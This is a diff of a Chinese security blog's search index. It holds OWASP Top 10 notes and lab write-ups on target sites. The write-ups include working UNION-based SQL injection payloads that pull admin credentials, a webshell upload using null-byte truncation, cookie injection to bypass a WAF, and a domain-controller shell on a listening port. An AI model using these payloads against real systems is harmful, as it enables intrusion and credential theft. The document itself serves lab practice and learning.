@@ -199,44 +199,73 @@
     <url>/2023/12/07/Top%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>[TOC]</p>
 <h3 id="👉🏻TOP1：越权漏洞-Broken-Access-Control"><a href="#👉🏻TOP1：越权漏洞-Broken-Access-Control" class="headerlink" title="👉🏻TOP1：越权漏洞 Broken Access Control"></a>👉🏻TOP1：越权漏洞 Broken Access Control</h3><p><strong>简介</strong></p>
-<p>分为水平越权和垂直越权。</p>
-<p><strong>水平越权</strong></p>
-<p>普通用户拥有其他平行级别用户的权限</p>
-<p><strong>垂直越权</strong></p>
-<p>跨越自身所属用户组，获取更高级别用户的权限（比如管理员权限）</p>
-<p><strong>场景分析</strong></p>
+<p>主要分为水平越权和垂直越权。</p>
 <ol>
-<li><p>session和id判断用户权限的区别</p>
-<p>前提：网站具有个人信息提交与查询功能。网站会给用户分配不同的Session（会话标识符）维持用户对话</p>
-<p>漏洞出现原因：网站以用户提交的id作为参考，判断用户是否具有信息查询权限并返回用户提交id对应的用户信息</p>
-<p>避免方式：根据用户本身的Session，判断当前用户是否拥有读取个人信息权限</p>
-<p>漏洞利用示例：攻击者A利用抓包工具将自动发送的查询请求中的userid修改为B用户的id，就可以查询到B用户的信息（水平越权）</p>
+<li><p><strong>水平越权</strong>：普通用户拥有其他平行级别用户的权限</p>
 </li>
-<li><p>接口名称</p>
-<p>前提：用户具有阅读文章权限而不具有编辑文章权限，阅读文章的接口是read_article。权限保护方式基于接口名称的秘密</p>
+<li><p><strong>垂直越权</strong>：跨越自身所属用户组，获取更高级别用户的权限（比如管理员权限）</p>
+<p>​</p>
+</li>
+</ol>
+<p><strong>常见情况</strong></p>
+<ol>
+<li><p>通过修改url、内部应用程序状态或HTML页面绕过访问控制检查，或简单地使用自定义的API攻击工具</p>
+<blockquote>
+<p>网站以用户提交的id判断用户是否具有信息查询权限并返回用户提交id对应的用户信息</p>
+<p>避免方式：根据用户本身的Session判断当前用户是否拥有读取个人信息权限</p>
+<p>漏洞利用示例：攻击者A利用抓包工具将自动发送的查询请求中的userid修改为B用户的id，就可以查询到B用户的信息；未加密且用的是get请求时，通过修改url里的userid直接登入其他用户的账号</p>
+</blockquote>
+</li>
+<li><p>特权提升，垂直越权</p>
+<blockquote>
+<p>用户具有阅读文章权限而不具有编辑文章权限，阅读文章的接口是read_article。权限保护方式基于接口名称的秘密</p>
 <p>漏洞出现原因：可以猜测到修改文章的接口是edit_article</p>
-<p>漏洞利用示例：攻击者A猜测修改文章的接口名称是edit_article，调用该接口（垂直越权）</p>
+<p>漏洞利用示例：攻击者A根据阅读文章的接口名称是read_article猜测修改文章的接口名称是edit_article，调用该接口，实现垂直越权</p>
+</blockquote>
 </li>
-<li><p>Cookie中参数</p>
-<p>前提：早期的网站设计会在Cookie中加入“admin &#x3D; true”标识用户是否具有管理员权限</p>
+<li><p>修改Cookie中参数</p>
+<blockquote>
+<p>早期的网站设计会在Cookie中加入“admin &#x3D; true”标识用户是否具有管理员权限</p>
 <p>漏洞出现原因：Cookie不同于Session，Cookie中的参数存储在用户浏览器上，可以直观展现给用户；Session存储在服务器端，比Cookie安全</p>
 <p>漏洞利用示例：攻击者A掌握网站的Cookie规律后</p>
 <p>​                           方法①：通过JavaScript代码重置 document.cookie 内容越权</p>
 <p>​                           方法②：抓包将“admin &#x3D; false”修改为“admin &#x3D; true”</p>
+</blockquote>
 </li>
 <li><p>系统权限回收有问题</p>
+<blockquote>
 <p>漏洞出现原因：网站保留了注销用户信息而没有把它从用户表中删除，而是对该用户是否有效的字段进行了标记</p>
 <p>漏洞利用示例：攻击者A注册时保留与注销用户B同样的用户id，覆盖了原用户的信息单保留了元用户的权限</p>
+</blockquote>
+<p>​</p>
 </li>
 </ol>
-<p><strong>漏洞防御</strong></p>
-<p>访问控制仅在受信任的服务器端代码或者在无服务器API中，攻击者无法修改访问控制检查或元数据</p>
+<p><strong>如何预防？</strong></p>
+<p>将访问控制限制在仅在受信任的服务器端代码或者无服务器API中，这样攻击者就无法修改访问控制检查或元数据</p>
 <ol>
-<li>合理划分网站权限，设置功能验证，验证失败禁止访问</li>
-<li>权限最小化原则。限制用户不必要的权限，权限过期后收回</li>
-<li>识别用户身份基于Session而非Cookie验证（在服务器端进行验证）</li>
+<li><p>合理划分网站权限，设置功能验证，验证失败禁止访问</p>
+</li>
+<li><p>最小权限原则。除公有资源外，其他资源默认情况下拒绝访问，限制用户不必要的权限，用户权限过期后收回</p>
+</li>
+<li><p>进行严格的权限判断，用户只能操作属于自己的内容。此处权限判断需要识别用户身份，识别用户身份基于Session而非Cookie验证（即在服务器端进行验证）</p>
+</li>
+<li><p>记录失败的访问控制，适当时候对管理员进行告警（比如银行卡密码最多输入三次三次输错需要重新验证&#x2F;找管理员更改密码，不能无限次试。避免了暴力破解）</p>
+</li>
+<li><p>对API和控制器的访问进行速率限制（避免高速爆破），最大限度降低自动化攻击工具的危害（也会有后续处置，比如后台发现某个ip多次异常尝试且多次失败，就把ip封了） </p>
+<p>​</p>
+</li>
 </ol>
-<h3 id="👉🏻TOP2：加密机制失效-Cryptographic-Failures"><a href="#👉🏻TOP2：加密机制失效-Cryptographic-Failures" class="headerlink" title="👉🏻TOP2：加密机制失效  Cryptographic Failures"></a>👉🏻TOP2：加密机制失效  Cryptographic Failures</h3><h3 id="👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures"><a href="#👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures" class="headerlink" title="👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures"></a>👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures</h3><p><strong>简介</strong></p>
+<p><strong>补充知识</strong></p>
+<ul>
+<li>网站会给用户分配不同的Session（会话标识符）维持用户对话</li>
+</ul>
+<p>​                      </p>
+<p>​                               </p>
+<h3 id="👉🏻TOP2：加密机制失效-Cryptographic-Failures"><a href="#👉🏻TOP2：加密机制失效-Cryptographic-Failures" class="headerlink" title="👉🏻TOP2：加密机制失效  Cryptographic Failures"></a>👉🏻TOP2：加密机制失效  Cryptographic Failures</h3><p><strong>简介</strong></p>
+<p>长</p>
+<p>​                </p>
+<p>​             </p>
+<h3 id="👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures"><a href="#👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures" class="headerlink" title="👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures"></a>👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures</h3><p><strong>简介</strong></p>
 <p>软件更新、关键资料（critical data）、持续集成&#x2F;持续部署（CI&#x2F;CD）流程等关键内容没有经过完整性验证导致产生的漏洞</p>
 <blockquote>
 <p>软件更新：指在已发布的软件版本中修复漏洞、增加功能或改进性能等目的而发布的新版本</p>
@@ -245,7 +274,7 @@
 <p>没有经过完整性验证：指的是在软件更新过程中，假设了某些关键资料的完整性已经被验证，或者假设了CI&#x2F;CD流程的整体安全性和正确性，而实际上并没有进行充分的验证。这样的假设可能导致漏洞或安全风险的存在</p>
 </blockquote>
 <p>​                                                                                           </p>
-<p><strong>数据完整性受到破坏的常见情况</strong></p>
+<p><strong>常见情况</strong></p>
 <ol>
 <li><strong>不安全的序列化和反序列化</strong>：当对象或数据被编码或序列化成攻击者可以看到和修改的结构时，容易受到不安全的反序列化攻击</li>
 <li><strong>依赖不受信任来源</strong>：应用程序来自不被信任的来源，包括一些不被信任的外部库、内容传递网络(CND)、库或者模组</li>
@@ -404,202 +433,6 @@
 
 <p>通过SSH协议连接到指定IP地址，成功登录后获取了root权限</p>
 <img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8736.png" class title="This is an test image"> 
-]]></content>
-      <tags>
-        <tag>Web-渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shop靶场&amp;封神台</title>
-    <url>/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="shop靶场-1"><a href="#shop靶场-1" class="headerlink" title="shop靶场-1"></a><strong>shop靶场-1</strong></h3><p><em>ps：借鉴了一部分其他小伙伴的渗透过程内容(csdn@哈哈哈cry)</em></p>
-<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
-<p>打开虚拟机后然后双击打开shop1:</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8737.png" class title="This is an test image">
-
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8738.png" class title="This is an test image">
-
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8739.png" class title="This is an test image">
-
-<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8740.png" class title="This is an test image">
-
-<p>点击关闭:</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8741.png" class title="This is an test image">
-
-<p>现在再点击就能打开了，如图：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8742.png" class title="This is an test image">
-
-<p>点击第一行：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8743.png" class title="This is an test image">
-
-<p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8744.png" class title="This is an test image">
-
-<p>先来试试弱密码：账号：admin 密码：admin</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8745.png" class title="This is an test image">
-
-<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8746.png" class title="This is an test image">
-
-
-
-
-
-<h3 id="shop靶场-2"><a href="#shop靶场-2" class="headerlink" title="shop靶场-2"></a>shop靶场-2</h3><p>打开过程同“shop靶场-1”</p>
-<p>首先进入后台先要找到后台登录页面，使用工具扫描没有结果，但发现了网站的后台：</p>
-<p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
-<p>跳转到网页后台登录页面：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8747.png" class title="This is an test image">
-
-<p>试一试之前试过的弱密码，失败</p>
-<p>接下来进行<strong>sql注入</strong></p>
-<p>打开阿D注入工具</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8748.png" class title="This is an test image">
-
-<p>将注入链接里面的IP地址改成我现在的地址，点击检测</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8749.png" class title="This is an test image">
-
-<p>点击检测标段，再点击admin</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8750.png" class title="This is an test image">
-
-<p>点击检测字段，再把password和admin勾选上</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8751.png" class title="This is an test image">
-
-<p>点击检测内容</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8752.png" class title="This is an test image">
-
-<p>结果出现两组账号密码，我们任选其中一组就行</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8753.png" class title="This is an test image">
-
-<p>在这里，我选择了上面一种，双击，出现账号和密码</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8754.png" class title="This is an test image">
-
-<p>我们发现密码好像被MD5加密过了，解密得</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8755.png" class title="This is an test image">
-
-<p>用获取的账号和密码进行登录</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8756.png" class title="This is an test image">
-
-<p>成功登录</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8757.png" class title="This is an test image">
-
-<p>上传木马</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8758.png" class title="This is an test image">
-
-<p>文件上传成功</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8759.png" class title="This is an test image">
-
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8760.png" class title="This is an test image">
-
-<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8761.png" class title="This is an test image">
-
-<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8762.png" class title="This is an test image">
-
-<p>打开菜刀，将木马路径输入进去</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8763.png" class title="This is an test image">
-
-<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8764.png" class title="This is an test image">
-
-
-
-<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8765.png" class title="This is an test image">
-
-<p><strong>判断是否存在SQL注入漏洞</strong></p>
-<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8766.png" class title="This is an test image"> 
-
-<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
-<p>2.构造 and 1&#x3D;2</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8767.png" class title="This is an test image">
-
-<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
-<p><strong>判断字段数</strong></p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8768.png" class title="This is an test image">
-
-<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8769.png" class title="This is an test image">
-
-<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8770.png" class title="This is an test image">
-
-<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
-<p><strong>判断回显点</strong></p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8771.png" class title="This is an test image">
-
-<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
-<p><strong>查询相关内容</strong></p>
-<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8772.png" class title="This is an test image">
-
-<p>页面回显maoshe</p>
-<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8773.png" class title="This is an test image">
-
-<p>回显版本号为5.5.53</p>
-<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8774.png" class title="This is an test image">
-
-<p>页面回显admin</p>
-<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
-<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8775.png" class title="This is an test image">
-
-<p>回显字段名为id</p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8776.png" class title="This is an test image">
-
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8777.png" class title="This is an test image">
-
-<p>回显password</p>
-<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8778.png" class title="This is an test image">
-
-<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
-<p>得到flag</p>
-<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8779.png" class title="This is an test image">
-
-<p>用御剑进行扫描，flag在二级目录里</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8780.png" class title="This is an test image">
-
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8781.png" class title="This is an test image">
-
-<p>点击链接，得到flag</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8782.png" class title="This is an test image">
-
-
-
-
-
-<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8783.png" class title="This is an test image">
-
-<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入</p>
-<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字</p>
-<p>因为网页做了waf过滤防护，这里考虑用cookie注入，可以进行绕过</p>
-<p>这里使用一个小工具进行注入</p>
-<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8784.png" class title="This is an test image">
-
-<p>出现账号和密码</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8785.png" class title="This is an test image">
-
-<p>将密码md5解密</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8786.png" class title="This is an test image">
-
-<p>用御剑进行扫描，获得后台地址：</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8787.png" class title="This is an test image">
-
-<p>输入之前获得的用户名和密码</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8788.png" class title="This is an test image">
-
-<p>成功拿到flag</p>
-<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8789.png" class title="This is an test image">
 ]]></content>
       <tags>
         <tag>Web-渗透测试</tag>
@@ -827,6 +660,202 @@
 
 <p>在攻击机上开启端口9999的监听，在攻击机上成功获取域控的shell</p>
 <img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87156.png" class title="This is an test image">  
+]]></content>
+      <tags>
+        <tag>Web-渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shop靶场&amp;封神台</title>
+    <url>/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h3 id="shop靶场-1"><a href="#shop靶场-1" class="headerlink" title="shop靶场-1"></a><strong>shop靶场-1</strong></h3><p><em>ps：借鉴了一部分其他小伙伴的渗透过程内容(csdn@哈哈哈cry)</em></p>
+<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
+<p>打开虚拟机后然后双击打开shop1:</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8737.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8738.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8739.png" class title="This is an test image">
+
+<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8740.png" class title="This is an test image">
+
+<p>点击关闭:</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8741.png" class title="This is an test image">
+
+<p>现在再点击就能打开了，如图：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8742.png" class title="This is an test image">
+
+<p>点击第一行：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8743.png" class title="This is an test image">
+
+<p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8744.png" class title="This is an test image">
+
+<p>先来试试弱密码：账号：admin 密码：admin</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8745.png" class title="This is an test image">
+
+<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8746.png" class title="This is an test image">
+
+
+
+
+
+<h3 id="shop靶场-2"><a href="#shop靶场-2" class="headerlink" title="shop靶场-2"></a>shop靶场-2</h3><p>打开过程同“shop靶场-1”</p>
+<p>首先进入后台先要找到后台登录页面，使用工具扫描没有结果，但发现了网站的后台：</p>
+<p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
+<p>跳转到网页后台登录页面：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8747.png" class title="This is an test image">
+
+<p>试一试之前试过的弱密码，失败</p>
+<p>接下来进行<strong>sql注入</strong></p>
+<p>打开阿D注入工具</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8748.png" class title="This is an test image">
+
+<p>将注入链接里面的IP地址改成我现在的地址，点击检测</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8749.png" class title="This is an test image">
+
+<p>点击检测标段，再点击admin</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8750.png" class title="This is an test image">
+
+<p>点击检测字段，再把password和admin勾选上</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8751.png" class title="This is an test image">
+
+<p>点击检测内容</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8752.png" class title="This is an test image">
+
+<p>结果出现两组账号密码，我们任选其中一组就行</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8753.png" class title="This is an test image">
+
+<p>在这里，我选择了上面一种，双击，出现账号和密码</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8754.png" class title="This is an test image">
+
+<p>我们发现密码好像被MD5加密过了，解密得</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8755.png" class title="This is an test image">
+
+<p>用获取的账号和密码进行登录</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8756.png" class title="This is an test image">
+
+<p>成功登录</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8757.png" class title="This is an test image">
+
+<p>上传木马</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8758.png" class title="This is an test image">
+
+<p>文件上传成功</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8759.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8760.png" class title="This is an test image">
+
+<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8761.png" class title="This is an test image">
+
+<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8762.png" class title="This is an test image">
+
+<p>打开菜刀，将木马路径输入进去</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8763.png" class title="This is an test image">
+
+<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
